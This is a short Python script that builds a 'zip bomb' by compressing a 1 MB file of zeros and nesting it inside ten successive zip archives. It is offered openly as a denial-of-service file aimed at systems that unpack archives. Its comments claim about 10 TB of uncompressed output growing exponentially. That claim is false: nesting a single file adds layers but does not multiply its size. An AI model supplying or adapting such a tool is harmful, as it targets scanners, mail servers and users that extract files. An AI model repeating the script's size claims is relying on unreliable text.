import os
import zipfile
import sys

def create_zip_bomb(output_file="bomb.zip", levels=10, base_size_mb=1):
    """
    Creates a zip bomb by nesting zip files.
    
    Args:
        output_file (str): The final zip bomb filename.
        levels (int): How many times to nest the zip. 
                      10 levels is manageable. 20+ is dangerous.
        base_size_mb (int): The size of the initial uncompressed file in MB.
    """
    if not os.path.exists(os.path.dirname(output_file) or "."):
        os.makedirs(os.path.dirname(output_file))
        
    # 1. Create the base file (highly compressible data)
    base_file = "base.bin"
    print(f"[INFO] Creating base file of {base_size_mb}MB...")
    with open(base_file, 'wb') as f:
        # Writing zeros is the most compressible pattern
        f.write(b'\x00' * (base_size_mb * 1024 * 1024))

    current_file = base_file
    
    # 2. Iterative Nesting
    for i in range(levels):
        next_file = f"stage_{i+1}.zip"
        print(f"[INFO] Creating stage {i+1}: {next_file}...")
        
        with zipfile.ZipFile(next_file, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
            # We zip the current file into the new zip
            zf.write(current_file, arcname=os.path.basename(current_file))
        
        # Clean up previous stage to save disk space during generation
        if current_file != base_file:
            os.remove(current_file)
            
        current_file = next_file

    # 3. Rename final file
    if current_file != output_file:
        os.rename(current_file, output_file)
        
    # Cleanup base file
    os.remove(base_file)
    
    # 4. Report
    final_size = os.path.getsize(output_file)
    print(f"[SUCCESS] Zip bomb created: {output_file}")
    print(f"[INFO] Final file size: {final_size / 1024 / 1024:.2f} MB")
    print(f"[WARNING] Do not extract on a production system. Uncompressed size will be exponential.")

if __name__ == "__main__":
    # Default: 10 levels, 1MB base. 
    # 10 levels with 1MB base results in ~10TB uncompressed (theoretical).
    # Adjust levels/base_size_mb as needed.
    create_zip_bomb("bomb.zip", levels=10, base_size_mb=1)